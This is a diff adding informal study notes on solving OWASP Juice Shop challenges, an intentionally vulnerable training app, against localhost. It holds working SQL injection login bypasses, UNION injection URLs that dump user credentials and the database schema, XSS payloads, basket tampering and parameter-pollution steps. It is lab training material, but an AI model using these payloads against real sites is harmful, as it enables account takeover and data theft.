@@ -1,0 +1,93 @@
+Browser, PostMan, OWASP Zed Attack Proxy (ZAP), Kali VM
+
+looked at about us and was able to find an ftp directory
+login: with password, javascript check matching password failed
+i may have accessed a confidential doc under ftp/ directory
+
+for admin
+\' OR true --
+any password
+admin@juice-sh.op
+
+That is a classical SQL injection. It returns the users where the name is admin OR where 1=1 (since 1 is indeed 1 every record will match). The -- just makes sure eveyrthing after it is seen as a comment 
+
+1' or 1=1 -- - 	blah 	SELECT * FROM users
+WHERE name='1' or 1=1 -- -'
+and password='blah'
+
+SELECT pass FROM users WHERE user_name = 'user3' or true -- ' and password = 'blahblah'
+admin: ' or true; --
+bender: ' or 1=1 and email like('%bender%');--
+jim: ' or 1=1 and email not like('%admin%');--
+
+' or 1=1 and email like('%nemo%');--
+
+went to main .js and searched for router to find out what specific routes there are
+#/administration
+#/accounting
+
+
+everything that is directly clickable from the client is a route.
+
+
+allowedMimeType: [
+  'application/pdf',
+  'application/xml',
+  'text/xml',
+  'application/zip',
+  'application/x-zip-compressed',
+  
+  
+ 
+changed quantity /api/BasketItems/1 (userID) to -1000
+
+/api/Feedbacks/ changed userID to something other than me
+
+
+put <script>alert('xss')</script> in customer feedback
+
+<<a|ascript>alert(xss)</script>
+ 
+ 
+{"email":"mc.safesearch@juice-sh.op","password":"Mr. N00dles"}
+
+0192023a7bbd73250516f069df18b500 hash for admin password
+searched in google for reverse
+
+PRODUCTS
+https://localhost:3000/rest/products/search?q=%27))%20union%20select%20%271%27,%20%272%27,%20%273%27,%20%274%27,%20%275%27,%20%276%27,%20%277%27,%20%278%27,%20%279%27%20from%20sqlite_master--
+
+USERS
+http://localhost:3000/rest/products/search?q=qwert%27))%20UNION%20SELECT%20id,%20email,%20password,%20%274%27,%20%275%27,%20%276%27,%20%277%27,%20%278%27,%20%279%27%20FROM%20Users--
+---------------
+Using '))-- for q fixes the syntax and successfully retrieves all products, including the (logically deleted) Christmas offer. Take note of its id (which should be 10)
+
+JSON search result with the Christmas special
+Go to http://localhost:3000/#/login and log in as any user.
+Add any regularly available product into you shopping basket to prevent problems at checkout later. Memorize your BasketId value in the request payload (when viewing the Network tab) or find the same information in the bid variable in your browser's Session Storage (in the Application tab).
+Craft and send a POST request to http://localhost:3000/api/BasketItems with
+
+    {"BasketId": "<Your Basket ID>", "ProductId": 10, "quantity": 1} as body
+    and application/json as Content-Type
+
+Go to http://localhost:3000/#/basket to verify that the "Christmas Super-Surprise-Box (2014 Edition)" is in the basket
+Click Checkout on the Your Basket page to solve the challenge.
+-----------------------
+
+privacy policy find <span class="hot"
+We may also instruct you to refuse all reasonably necessary responsibility
+
+---database schema ---
+localhost:3000/rest/products/search?q=sldjfwo')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--
+
+-----------------
+Perform a persisted XSS attack bypassing a client-side security mechanism
+
+    Submit a POST request to http://localhost:3000/api/Users with
+        {"email": "<iframe src=\"javascript:alert(`xss`)\">", "password": "xss"} as body
+
+
+manipulating another basked
+Submit a POST request to http://localhost:3000/api/BasketItems with payload as {"ProductId": 14,"BasketId": "2","quantity": 1} making sure no product of that with ProductId of 14 is already in the target basket. Make sure to supply your Authorization Bearer token in the request header.
+You will receive a (probably unexpected) response of {'error' : 'Invalid BasketId'} - after all, it is not your basket!
+Change your POST request into utilizing HTTP Parameter Pollution (HPP) by supplying your own BasketId and that of someone else in the same payload, i.e. {"ProductId": 14,"BasketId": "1","quantity": 1,"BasketId": "2"}.
